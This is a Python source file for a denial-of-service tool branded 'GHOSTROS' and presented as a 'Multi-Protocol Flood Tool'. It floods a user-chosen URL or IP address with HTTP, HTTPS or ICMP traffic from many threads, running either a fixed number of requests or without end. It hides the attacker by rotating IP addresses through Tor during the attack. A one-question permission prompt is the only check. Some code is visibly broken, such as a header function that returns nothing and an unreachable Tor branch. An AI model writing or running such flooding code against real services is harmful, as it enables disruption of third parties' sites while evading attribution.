import requests
import concurrent.futures
import threading
import time
import re
import subprocess
import platform
import socket
import random
import urllib.parse
import string
import json
import os
import sys
from datetime import datetime
from collections import defaultdict

def display_ASCII_intro():
    """Display ASCII art intro with colors"""
    color_start = "\033[38;5;93m"
    color_end = "\033[0m"

    art = """

   ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗██████╗  ██████╗ ███████╗
   ██╔════╝ ██║  ██║██╔════╝ ██╔════╝╚══██╔══╝██╔══██╗██╔═══██╗██╔════╝
   ██║  ███╗███████║██║  ███╗███████╗   ██║   ██████╔╝██║   ██║███████╗
   ██║   ██║██╔══██║██║   ██║╚════██║   ██║   ██╔══██╗██║   ██║╚════██║
   ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   ██║  ██║╚██████╔╝███████║
    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝
                        
                                                                                                        
    """
    print(f"{color_start}{art}{color_end}")
    time.sleep(2)

def check_root_permissions():
    """Check if script is running as root (for Linux/Unix systems)"""
    if platform.system().lower() != "windows":
        try:
            if os.geteuid() != 0:
                print("\033[1;31mERROR:\033[0m This script must be run as root on Linux/Unix systems.")
                print("Use: sudo python3 http_flood.py")
                sys.exit(1)
        except AttributeError:
            # Windows doesn't have geteuid
            pass

def install_dependencies():
    """Install required dependencies for IP rotation"""
    try:
        if platform.system().lower() == "windows":
            print("\033[1;33mWARNING:\033[0m IP rotation features require Linux/Unix with Tor service.")
            return False
            
        distro = subprocess.check_output("lsb_release -d", shell=True).decode().strip()
        if "Ubuntu" in distro or "Debian" in distro:
            subprocess.run(["apt-get", "update"])
            subprocess.run(["apt-get", "install", "-y", "curl", "tor"])
        elif "Fedora" in distro or "CentOS" in distro or "Red Hat" in distro:
            subprocess.run(["yum", "install", "-y", "curl", "tor"])
        elif "Arch" in distro:
            subprocess.run(["pacman", "-S", "--noconfirm", "curl", "tor"])
        else:
            print("\033[1;31mERROR:\033[0m Unsupported distribution!")
            print("\033[1;33m***************************************")
            print("* Supported distributions:            *")
            print("***************************************")
            print("• Ubuntu")
            print("• Debian")
            print("• Fedora")
            print("• CentOS")
            print("• Red Hat")
            print("• Arch")
            print("***************************************\033[0m")
            return False
        return True
    except Exception as e:
        print(f"\033[1;31mERROR:\033[0m Failed installing dependencies: {e}")
        return False

def check_dependencies():
    """Check if required dependencies are installed"""
    try:
        if platform.system().lower() == "windows":
            return False
            
        subprocess.check_call(["curl", "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.check_call(["tor", "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except subprocess.CalledProcessError:
        print("\033[33mInstalling curl and tor...\033[0m")
        return install_dependencies()

def start_tor():
    """Start Tor service for IP rotation"""
    try:
        if platform.system().lower() == "windows":
            print("\033[1;33mWARNING:\033[0m Tor service management not available on Windows.")
            return False
            
        tor_status = subprocess.check_output(["systemctl", "is-active", "tor"]).decode().strip()
        if tor_status != "active":
            print("\033[33mStarting Tor service...\033[0m")
            subprocess.run(["systemctl", "start", "tor"])
        return True
    except Exception as e:
        print(f"\033[1;31mERROR:\033[0m Failed starting Tor service: {e}")
        return False

def get_current_ip():
    """Get current IP address through Tor proxy or direct connection"""
    primary_url = "https://checkip.amazonaws.com"
    secondary_url = "https://api.ipify.org"
    tertiary_url = "https://icanhazip.com"
    headers = {"User-Agent": "Mozilla/5.0"}
    
    # Try direct connection first (for Windows)
    try:
        response = requests.get(primary_url, headers=headers, timeout=10)
        return response.text.strip()
    except requests.RequestException:
        print("\033[1;31mERROR:\033[0m Primary IP service failed.")
        print("\033[1;33mWARNING:\033[0m Switching to secondary IP service...")
        try:
            response = requests.get(secondary_url, headers=headers, timeout=10)   
            return response.text.strip()
        except requests.RequestException:
            print("\033[1;31mERROR:\033[0m Secondary IP service failed.")
            print("\033[1;33mWARNING:\033[0m Switching to tertiary IP service...")
            try:
                response = requests.get(tertiary_url, headers=headers, timeout=10)
                return response.text.strip() 
            except requests.RequestException as e:
                print(f"\033[1;31mERROR:\033[0m Failed fetching IP: {e}")
                return None
    
    # If Tor is available, try through proxy
    if platform.system().lower() != "windows":
        proxies = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}
        try:
            response = requests.get(primary_url, headers=headers, proxies=proxies, timeout=10)
            return response.text.strip()
        except requests.RequestException:
            pass

def change_ip():
    """Change IP address using Tor"""
    try:
        if platform.system().lower() == "windows":
            print("\033[1;33mWARNING:\033[0m IP rotation not available on Windows.")
            return False
            
        subprocess.run(["systemctl", "reload", "tor"], check=True)
        time.sleep(5)
        new_ip = get_current_ip()  
        if new_ip:
            print(f"\n\033[1;32mNew IP address:\033[0m {new_ip}")
            show_ip_location(new_ip)
            return True
        return False
    except subprocess.CalledProcessError as e:
        print(f"\033[1;31mERROR:\033[0m Failed reloading Tor: {e}")
        return False

def show_ip_location(ip):
    """Show geolocation information for IP address"""
    api_services = [
        (f"https://ipapi.co/{ip}/json/", ["city", "region", "country_name"]),
        (f"http://ip-api.com/json/{ip}", ["city", "regionName", "country"]),
        (f"https://ipwhois.app/json/{ip}", ["city", "region", "country"]),
    ]
    
    random.shuffle(api_services)  

    for url, fields in api_services:
        try:
            response = requests.get(url, timeout=random.randint(5, 10))
            if response.status_code == 200:
                data = response.json()
                print(f"\033[1;36mCity:\033[0m {data.get(fields[0], 'Unknown')}")
                print(f"\033[1;36mRegion:\033[0m {data.get(fields[1], 'Unknown')}")
                print(f"\033[1;36mCountry:\033[0m {data.get(fields[2], 'Unknown')}")
                return
        except requests.RequestException as e:
            print(f"\033[1;31mERROR:\033[0m Failed with {url}: {e}")
    
    print("\033[1;31mERROR:\033[0m All geolocation services failed.")

def setup_ip_rotation():
    """Setup IP rotation functionality"""
    print("\n=== IP Rotation Setup ===")
    print("IP rotation allows you to change your IP address during attacks")
    print("This feature requires Tor service and is only available on Linux/Unix systems")
    
    if platform.system().lower() == "windows":
        print("\033[1;33mWARNING:\033[0m IP rotation is not available on Windows.")
        return False, 0, 0
    
    use_ip_rotation = input("Enable IP rotation? (y/n): ").strip().lower()
    
    if use_ip_rotation != 'y':
        return False, 0, 0
    
    # Check dependencies and start Tor
    if not check_dependencies():
        print("\033[1;31mERROR:\033[0m Failed to setup IP rotation dependencies.")
        return False, 0, 0
    
    if not start_tor():
        print("\033[1;31mERROR:\033[0m Failed to start Tor service.")
        return False, 0, 0
    
    # Get IP rotation parameters
    try:
        interval = input("Enter time interval in seconds for IP changes (0 for random 10-20s): ").strip()
        times = input("Enter number of IP changes (0 for infinite): ").strip()
        
        if not interval.isdigit() or not times.isdigit():
            print("\033[1;31mERROR:\033[0m Please enter valid numbers.")
            return False, 0, 0

        interval = int(interval)
        times = int(times)
        
        if interval == 0:
            interval = "random"
        
        print(f"\033[1;32mIP rotation configured:\033[0m")
        print(f"  Interval: {interval if interval != 'random' else 'Random 10-20s'}")
        print(f"  Changes: {times if times > 0 else 'Infinite'}")
        
        return True, interval, times
        
    except ValueError:
        print("\033[1;31mERROR:\033[0m Invalid input.")
        return False, 0, 0

def ip_rotation_worker(interval, times):
    """Background worker for IP rotation"""
    change_count = 0
    
    try:
        while True:
            # Check if we've reached the limit
            if times > 0 and change_count >= times:
                print("\033[1;33mIP rotation limit reached. Stopping IP changes.\033[0m")
                break
            
            # Calculate sleep time
            if interval == "random":
                sleep_time = random.randint(10, 20)
            else:
                sleep_time = interval
            
            time.sleep(sleep_time)
            
            # Change IP
            print(f"\n🔄 Changing IP address... (change #{change_count + 1})")
            if change_ip():
                change_count += 1
            else:
                print("\033[1;31mFailed to change IP. Continuing with current IP.\033[0m")
                
    except Exception as e:
        print(f"\033[1;31mIP rotation worker error: {e}\033[0m")

def check_my_ip():
    """Simple function to check and display current IP"""
    print("\n=== IP Address Check ===")
    current_ip = get_current_ip()
    if current_ip:
        print(f"🌐 Your current IP: {current_ip}")
        show_ip_location(current_ip)
        return current_ip
    else:
        print("❌ Could not determine current IP")
        return None

def get_protocol_choice():
    """Ask user to choose between HTTP, HTTPS, and ICMP"""
    while True:
        print("\n=== Attack Protocol Selection ===")
        print("1. HTTP Flood")
        print("2. HTTPS Flood") 
        print("3. ICMP Ping Flood")
        choice = input("Choose attack protocol (1, 2, or 3): ").strip()
        if choice == "1":
            return "http"
        elif choice == "2":
            return "https"
        elif choice == "3":
            return "icmp"
        else:
            print("Invalid choice. Please enter 1, 2, or 3.")

def validate_domain(domain):
    """Validate domain format"""
    # Remove protocol if present
    domain = re.sub(r'^https?://', '', domain)
    # Remove trailing slash
    domain = domain.rstrip('/')
    # Basic domain validation
    if re.match(r'^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$', domain):
        return domain
    return None

def resolve_domain(domain):
    """Resolve domain to IP address"""
    try:
        ip = socket.gethostbyname(domain)
        return ip
    except socket.gaierror:
        return None

def get_realistic_headers():
    """Generate realistic browser headers"""
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    ]
    


def validate_url(url):
    """Validate and clean the URL"""
    # Remove any whitespace
    url = url.strip()
    
    # If URL doesn't start with http:// or https://, add protocol
    if not url.startswith(('http://', 'https://')):
        # Default to HTTPS for security
        url = 'https://' + url
    
    # Parse URL to validate
    try:
        parsed = urllib.parse.urlparse(url)
        if not parsed.netloc:
            return None
        return url
    except:
        return None

def get_target_url():
    """Get target URL from user with flexible input"""
    print("\n=== URL Input Options ===")
    print("1. Enter full URL (e.g., https://example.com/)")
    print("2. Enter domain only (e.g., example.com)")
    print("3. Manual input (host, port, path)")
    
    choice = input("\nChoose input method (1, 2, or 3): ").strip()
    
    if choice == "1":
        # Full URL input
        url = input("Enter full URL: ").strip()
        validated_url = validate_url(url)
        if validated_url:
            return validated_url
        else:
            print("Invalid URL format. Please try again.")
            return get_target_url()
        
    elif choice == "2":
        # Domain only input
        protocol = get_protocol_choice()
        domain = input("Enter domain (e.g., example.com): ").strip()
        
        # Validate domain
        validated_domain = validate_domain(domain)
        if not validated_domain:
            print("Invalid domain format. Please try again.")
            return get_target_url()
        
        # Try to resolve domain
        ip = resolve_domain(validated_domain)
        if ip:
            print(f"✅ Domain resolved: {validated_domain} -> {ip}")
        else:
            print(f"⚠️  Warning: Could not resolve {validated_domain}")
            confirm = input("Continue anyway? (y/n): ").strip().lower()
            if confirm != 'y':
                return get_target_url()
        
        path = input("Enter path (default: /): ").strip() or "/"
        url = f"{protocol}://{validated_domain}{path}"
        return validate_url(url)
        
    elif choice == "3":
        # Manual input (original method)
        protocol = get_protocol_choice()
        host = input("Enter target host (e.g., example.com): ").strip()
        port = input("Enter port (e.g., 80, 443, 8080) or press Enter for default: ").strip()
        path = input("Enter path (e.g., /test, /): ").strip() or "/"
        
        if port:
            url = f"{protocol}://{host}:{port}{path}"
        else:
            url = f"{protocol}://{host}{path}"
        
        return validate_url(url)
    
    else:
        print("Invalid choice. Using default method.")
        return get_target_url()

def get_target_ip():
    """Get target IP for ICMP ping flood"""
    print("\n=== ICMP Target Input ===")
    print("1. Enter IP address (e.g., 8.8.8.8)")
    print("2. Enter domain (will resolve to IP)")
    
    choice = input("\nChoose input method (1 or 2): ").strip()
    
    if choice == "1":
        ip = input("Enter target IP address: ").strip()
        # Basic IP validation
        try:
            socket.inet_aton(ip)
            return ip
        except socket.error:
            print("Invalid IP address format.")
            return None
    elif choice == "2":
        domain = input("Enter domain (e.g., google.com): ").strip()
        validated_domain = validate_domain(domain)
        if not validated_domain:
            print("Invalid domain format.")
            return None
        
        try:
            ip = socket.gethostbyname(validated_domain)
            print(f"✅ Resolved {validated_domain} to {ip}")
            return ip
        except socket.gaierror:
            print(f"❌ Could not resolve {validated_domain}")
            return None
    else:
        print("Invalid choice. Using IP input.")
        ip = input("Enter target IP address: ").strip()
        try:
            socket.inet_aton(ip)
            return ip
        except socket.error:
            print("Invalid IP address format.")
            return None

def ping_target(ip):
    """Send ping to target IP"""
    try:
        if platform.system().lower() == "windows":
            # Windows ping command
            result = subprocess.run(['ping', '-n', '1', '-w', '1000', ip], 
                                  capture_output=True, text=True, timeout=2)
            if result.returncode == 0:
                return "Success"
            else:
                return "Failed"
        else:
            # Linux/Unix ping command
            result = subprocess.run(['ping', '-c', '1', '-W', '1', ip], 
                                  capture_output=True, text=True, timeout=2)
            if result.returncode == 0:
                return "Success"
            else:
                return "Failed"
    except Exception as e:
        return f"Error: {str(e)}"

def send_icmp_flood(target_ip, thread_count=50):
    """Send ICMP ping flood"""
    def ping_worker():
        while True:
            result = ping_target(target_ip)
            print(f"ICMP Ping: {result} -> {target_ip}")
            time.sleep(0.1)  # Small delay to prevent overwhelming
    
    print(f"🚀 Starting ICMP ping flood to {target_ip} with {thread_count} threads...")
    print("Press Ctrl+C to stop")
    
    threads = []
    for i in range(thread_count):
        thread = threading.Thread(target=ping_worker)
        thread.daemon = True
        threads.append(thread)
        thread.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n🛑 Stopping ICMP flood...")

# Global statistics tracking
class AttackStats:
    def __init__(self):
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.start_time = None
        self.status_codes = defaultdict(int)
        self.response_times = []
        self.lock = threading.Lock()
    
    def update(self, status_code, response_time=None, success=True):
        with self.lock:
            self.total_requests += 1
            if success:
                self.successful_requests += 1
            else:
                self.failed_requests += 1
            self.status_codes[status_code] += 1
            if response_time:
                self.response_times.append(response_time)
    
    def get_stats(self):
        with self.lock:
            if not self.start_time:
                return {}
            
            elapsed = time.time() - self.start_time
            avg_response_time = sum(self.response_times) / len(self.response_times) if self.response_times else 0
            success_rate = (self.successful_requests / self.total_requests * 100) if self.total_requests > 0 else 0
            
            return {
                'total_requests': self.total_requests,
                'successful_requests': self.successful_requests,
                'failed_requests': self.failed_requests,
                'success_rate': success_rate,
                'requests_per_second': self.total_requests / elapsed if elapsed > 0 else 0,
                'avg_response_time': avg_response_time,
                'elapsed_time': elapsed,
                'status_codes': dict(self.status_codes)
            }
    
    def start(self):
        self.start_time = time.time()

# Global stats instance
stats = AttackStats()



def get_rate_limiting():
    """Get rate limiting configuration"""
    print("\n=== Rate Limiting Configuration ===")
    use_rate_limit = input("Use rate limiting? (y/n): ").strip().lower()
    
    if use_rate_limit == 'y':
        try:
            requests_per_second = float(input("Requests per second (default: 10): ").strip() or "10")
            delay_between_requests = 1.0 / requests_per_second
            return delay_between_requests
        except ValueError:
            print("Invalid rate. Using default (10 req/s)")
            return 0.1
    return 0

def print_real_time_stats():
    """Print real-time attack statistics"""
    while True:
        time.sleep(2)  # Update every 2 seconds
        current_stats = stats.get_stats()
        if current_stats:
            print(f"\n📊 REAL-TIME STATS:")
            print(f"   Total Requests: {current_stats['total_requests']}")
            print(f"   Success Rate: {current_stats['success_rate']:.1f}%")
            print(f"   Requests/sec: {current_stats['requests_per_second']:.1f}")
            print(f"   Avg Response Time: {current_stats['avg_response_time']:.3f}s")
            print(f"   Elapsed Time: {current_stats['elapsed_time']:.1f}s")
            print(f"   Status Codes: {dict(current_stats['status_codes'])}")

# 🔁 Target URL (will be set by user input)
URL = None

# 🧵 Number of concurrent requests
TOTAL_REQUESTS = 1000
THREADS = 100  # Number of parallel threads

def send_request(rate_limit_delay=0):
    try:
        start_time = time.time()
        headers = get_realistic_headers()
        response = requests.get(URL, timeout=5, headers=headers)
        response_time = time.time() - start_time
        
        # Update statistics
        stats.update(response.status_code, response_time, True)
        
        # Apply rate limiting
        if rate_limit_delay > 0:
            time.sleep(rate_limit_delay)
        
        return response.status_code
    except Exception as e:
        # Update statistics for failed request
        stats.update(str(e), None, False)
        return str(e)

def send_continuous_request(url, verify_ssl=True, rate_limit_delay=0):
    """Send continuous requests in a loop"""
    headers = get_realistic_headers()
    
    try:
        while True:
            start_time = time.time()
            response = requests.get(url, verify=verify_ssl, timeout=5, headers=headers)
            response_time = time.time() - start_time
            
            # Update statistics
            stats.update(response.status_code, response_time, True)
            
            print(f"Status: {response.status_code} | URL: {url}")
            
            # Apply rate limiting
            if rate_limit_delay > 0:
                time.sleep(rate_limit_delay)
    except Exception as e:
        # Update statistics for failed request
        stats.update(str(e), None, False)
        print(f"Error: {e}")

def get_attack_parameters():
    """Get attack parameters from user"""
    global TOTAL_REQUESTS, THREADS
    
    print("\n=== Attack Configuration ===")
    
    # Get number of requests for ThreadPool mode
    try:
        total_requests = input("Number of requests (default: 1000): ").strip()
        if total_requests:
            TOTAL_REQUESTS = int(total_requests)
    except ValueError:
        print("Invalid number, using default: 1000")
    
    # Get number of threads
    try:
        threads = input("Number of threads (default: 100): ").strip()
        if threads:
            THREADS = int(threads)
    except ValueError:
        print("Invalid number, using default: 100")
    
    return TOTAL_REQUESTS, THREADS

def main():
    global URL, TOTAL_REQUESTS, THREADS
    
    print("=== Multi-Protocol Flood Tool ===")
    print("⚠️  WARNING: Only use this tool on your own servers or with permission!")
    print("⚠️  Using this tool against unauthorized targets is illegal!")
    
    confirm = input("\nDo you have permission to test this target? (y/n): ").strip().lower()
    if confirm != 'y':
        print("Exiting for safety reasons.")
        return
    
    # Setup IP rotation
    ip_rotation_enabled, ip_interval, ip_times = setup_ip_rotation()
    
    # Get attack protocol
    protocol = get_protocol_choice()
    
    if protocol in ["http", "https"]:
        # HTTP/HTTPS attack
        URL = get_target_url()
        if not URL:
            print("Invalid URL. Exiting.")
            return
            
        print(f"\n🎯 Target URL: {URL}")
        
        # Get rate limiting settings
        rate_limit_delay = get_rate_limiting()
        
        # Get attack parameters
        TOTAL_REQUESTS, THREADS = get_attack_parameters()
        
        # Ask user for attack mode
        mode = input("\nChoose attack mode:\n1. ThreadPool (limited requests)\n2. Continuous threads (infinite)\nEnter choice (1 or 2): ").strip()
        
        if mode == "1":
            # Original ThreadPool mode
            print(f"\n🚀 Sending {TOTAL_REQUESTS} requests to {URL} using {THREADS} threads...")
            
            # Start statistics tracking
            stats.start()
            
            # Start real-time stats thread
            stats_thread = threading.Thread(target=print_real_time_stats, daemon=True)
            stats_thread.start()
            
            # Start IP rotation thread if enabled
            ip_rotation_thread = None
            if ip_rotation_enabled:
                ip_rotation_thread = threading.Thread(target=ip_rotation_worker, args=(ip_interval, ip_times), daemon=True)
                ip_rotation_thread.start()
                print(f"🔄 IP rotation enabled - changing IP every {ip_interval if ip_interval != 'random' else '10-20'} seconds")
            
            start = time.time()
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
                futures = [executor.submit(send_request, rate_limit_delay) for _ in range(TOTAL_REQUESTS)]
                
                completed = 0
                for future in concurrent.futures.as_completed(futures):
                    status = future.result()
                    completed += 1
                    print(f"[{completed}/{TOTAL_REQUESTS}] Response: {status}")
            
            end = time.time()
            print(f"\n✅ Completed in {end - start:.2f} seconds")
            
            # Print final statistics
            final_stats = stats.get_stats()
            if final_stats:
                print(f"📊 FINAL STATISTICS:")
                print(f"   Total Requests: {final_stats['total_requests']}")
                print(f"   Success Rate: {final_stats['success_rate']:.1f}%")
                print(f"   Requests/sec: {final_stats['requests_per_second']:.1f}")
                print(f"   Avg Response Time: {final_stats['avg_response_time']:.3f}s")
                print(f"   Status Codes: {final_stats['status_codes']}")
            
        elif mode == "2":
            # New continuous threading mode
            print(f"\n🚀 Starting continuous attack on {URL}...")
            print("Press Ctrl+C to stop")
            
            # Start statistics tracking
            stats.start()
            
            # Start real-time stats thread
            stats_thread = threading.Thread(target=print_real_time_stats, daemon=True)
            stats_thread.start()
            
            # Start IP rotation thread if enabled
            ip_rotation_thread = None
            if ip_rotation_enabled:
                ip_rotation_thread = threading.Thread(target=ip_rotation_worker, args=(ip_interval, ip_times), daemon=True)
                ip_rotation_thread.start()
                print(f"🔄 IP rotation enabled - changing IP every {ip_interval if ip_interval != 'random' else '10-20'} seconds")
            
            # Determine if we should verify SSL
            verify_ssl = URL.startswith("https://")
            if not verify_ssl:
                verify_ssl = False
            
            # Launch multiple threads
            threads = []
            for i in range(THREADS):  # Use configured thread count
                thread = threading.Thread(target=send_continuous_request, args=(URL, verify_ssl, rate_limit_delay))
                thread.daemon = True  # Make threads daemon so they stop when main program exits
                threads.append(thread)
                thread.start()
            
            print(f"🔥 {THREADS} threads started. Press Ctrl+C to stop...")
            
            try:
                # Keep main thread alive
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n🛑 Stopping attack...")
                
        else:
            print("Invalid choice. Exiting.")
    
    elif protocol == "icmp":
        # ICMP ping flood attack
        target_ip = get_target_ip()
        if not target_ip:
            print("Invalid target. Exiting.")
            return
        
        print(f"\n🎯 Target IP: {target_ip}")
        
        # Get ICMP parameters
        try:
            thread_count = input("Number of ICMP threads (default: 50): ").strip()
            if thread_count:
                thread_count = int(thread_count)
            else:
                thread_count = 50
        except ValueError:
            print("Invalid number, using default: 50")
            thread_count = 50
        
        # Start IP rotation thread if enabled
        ip_rotation_thread = None
        if ip_rotation_enabled:
            ip_rotation_thread = threading.Thread(target=ip_rotation_worker, args=(ip_interval, ip_times), daemon=True)
            ip_rotation_thread.start()
            print(f"🔄 IP rotation enabled - changing IP every {ip_interval if ip_interval != 'random' else '10-20'} seconds")
        
        # Start ICMP flood
        send_icmp_flood(target_ip, thread_count)
    
    else:
        print("Invalid protocol choice. Exiting.")

if __name__ == "__main__":
    display_ASCII_intro()
    check_root_permissions()
    
    # Show current IP before starting
    print("\n=== Current IP Address ===")
    current_ip = get_current_ip()
    if current_ip:
        print(f"🌐 Your current IP: {current_ip}")
        show_ip_location(current_ip)
    else:
        print("❌ Could not determine current IP")
    
    setup_ip_rotation()
    main()
